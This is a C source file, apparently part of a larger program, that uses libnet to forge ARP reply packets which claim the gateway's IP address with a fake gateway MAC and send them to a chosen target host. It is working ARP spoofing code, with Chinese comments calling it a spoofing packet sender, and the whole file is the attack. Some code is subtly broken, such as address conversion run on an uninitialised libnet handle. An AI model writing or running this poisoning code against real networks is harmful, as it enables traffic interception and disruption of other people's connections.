#include "spk.h"

#include <arpa/inet.h>
#include <sys/types.h>
#include <net/ethernet.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <libnet.h>

extern char GATEWAY[17];
extern u_int8_t FACK_GATEWAY_MAC[7];
//arp欺骗包发送函数，用之前要先确定方向.这里暂时定my_packet->dst为干扰的目标方向。//
int arp_spoofind(char * dst_ip_str ,u_char * dst_mac)
{
    libnet_t *handle;        /* Libnet句柄 */
    int packet_size;
    char *device = {"em0"};    /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
    char *src_ip_str=GATEWAY;
    //char  *src_ip_str= {"202.192.44.254"};        /* 冒充的网关IP */
    //printf("src_ip_str %s\n",src_ip_str);
    //u_int8_t src_mac[6] = {0x00, 0x0C, 0x29, 0x30, 0x9C, 0x7d};/* 虚假的源MAC */

//    int i;
//    printf("mac ");
//    for(i=0; i<6; i++)
//    {
//        printf(" %x",dst_mac[i]);
//    }
//    printf("\n");

    u_int32_t dst_ip, src_ip;                /* 网路序的目的IP和源IP */
    char error[LIBNET_ERRBUF_SIZE];        /* 出错信息 */
    libnet_ptag_t arp_proto_tag, eth_proto_tag;

     /* 把目的IP地址字符串转化成网络序 */
    dst_ip = libnet_name2addr4(handle,dst_ip_str, LIBNET_RESOLVE); //可能有memcpy error
    /* 把源IP地址字符串转化成网络序 */
    src_ip = libnet_name2addr4(handle, (char *)src_ip_str, LIBNET_RESOLVE);

    if ( dst_ip == -1 || src_ip == -1 )
    {
        printf("ip address convert error\n");
        exit(-1);
    };

    /* 初始化Libnet,注意第一个参数和TCP初始化不同 */
    if ( (handle = libnet_init(LIBNET_LINK_ADV, device, error)) == NULL )
    {
        printf("libnet_init: error [%s]\n", error);
        exit(-2);
    };

    /* 构造arp协议块 */
    arp_proto_tag = libnet_build_arp(
                ARPHRD_ETHER,        /* 硬件类型,1表示以太网硬件地址 */
                ETHERTYPE_IP,        /* 0x0800表示询问IP地址 */
                6,                    /* 硬件地址长度 */
                4,                    /* IP地址长度 */
                ARPOP_REPLY,        /* 操作方式:ARP请求 */
                FACK_GATEWAY_MAC,                /* source MAC addr */
                (u_int8_t *)&src_ip,    /* src proto addr */
                (u_int8_t *)&dst_mac,                /* dst MAC addr */
                (u_int8_t *)&dst_ip,    /* dst IP addr */
                NULL,                /* no payload */
                0,                    /* payload length */
                handle,                /* libnet tag */
                0                    /* Create new one */
    );
    if (arp_proto_tag == -1)
    {
        printf("build IP failure\n");
        exit(-3);
    };

    /* 构造一个以太网协议块
    You should only use this function when
    libnet is initialized with the LIBNET_LINK interface.*/
    eth_proto_tag = libnet_build_ethernet(
        (u_int8_t *)&dst_mac,            /* 以太网目的地址 */
        FACK_GATEWAY_MAC,            /* 以太网源地址 */
        ETHERTYPE_ARP,    /* 以太网上层协议类型，此时为ARP请求 */
        NULL,            /* 负载，这里为空 */
        0,                /* 负载大小 */
        handle,            /* Libnet句柄 */
        0                /* 协议块标记，0表示构造一个新的 */
    );
    if (eth_proto_tag == -1)    {
        printf("build eth_header failure\n");
        return (-4);
    };


        packet_size = libnet_write(handle);/* 发送arp欺骗广播 */
        printf("ARP SPOOFIND SENT: %s\n",dst_ip_str);




    libnet_destroy(handle);                /* 释放句柄 */

    return (0);
}
